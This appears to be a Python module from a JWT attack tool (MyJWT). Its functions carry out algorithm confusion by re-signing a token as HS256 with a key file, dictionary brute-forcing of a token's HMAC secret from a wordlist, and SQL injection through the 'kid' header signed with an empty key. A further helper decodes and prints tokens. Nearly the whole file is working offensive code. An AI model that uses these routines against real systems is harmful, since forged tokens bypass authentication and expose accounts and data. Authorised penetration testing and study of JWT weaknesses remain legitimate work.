import click
from texttable import Texttable

from MyJWT.modifyJWT import changeAlg, signature
from MyJWT.utils import jwtToJson, encodeJwt


def checkHmac(jwtJson, file):
    jwtJson = changeAlg(jwtJson, "HS256")
    return signature(jwtJson, open(file).read())


def bruteforceDict(jwt, fileName):
    jwtJson = jwtToJson(jwt)
    with open(fileName, 'r') as file:
        allPassword = [line.rstrip() for line in file]
    file.close()
    table = Texttable()
    table.set_cols_align(["c", "m", "c"])
    table.set_cols_valign(["m", "m", "m"])
    table.set_max_width(0)
    table.header(["Passord", "Key", "valid Key"])
    for password in allPassword:
        newJwt = signature(jwtJson, password)
        newSig = newJwt.split('.')[2]
        table.add_row([password, signature(jwtJson, password), "yes" if newSig == jwt.split('.')[2] else "no"])
    print(table.draw() + "\n")


def injectSqlKid(jwt, injection):
    jwtJson = jwtToJson(jwt)
    jwtJson["header"]["kid"] = injection
    return signature(jwtJson, "")


def printDecoded(jwt):
    jwtJson = jwtToJson(jwt)
    click.echo(f"Header: {jwtJson['header']}")
    click.echo(f"Payload: {jwtJson['payload']}")
    click.echo(f"Signature: {jwtJson['signature']}")
    jwtEncoded = encodeJwt(jwtJson)
    click.echo(jwtEncoded)
